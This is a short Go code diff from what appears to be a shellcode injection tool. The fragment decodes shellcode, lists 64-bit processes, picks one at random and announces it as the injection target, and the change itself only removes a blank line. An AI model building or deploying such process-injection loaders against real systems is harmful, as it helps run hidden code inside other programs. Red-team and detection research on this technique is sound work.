@@ -19,7 +19,6 @@ func main() {
 		fmt.Printf("\nError decoding shellcode: %s\n", err)
 		os.Exit(1)
 	}
-
 	processInjectionCandidates := inject.Get64BitProcesses()
 	chosenPID := inject.SelectRandomElement(processInjectionCandidates)
 	fmt.Printf("\n[+] Selected %d for injection.", chosenPID)
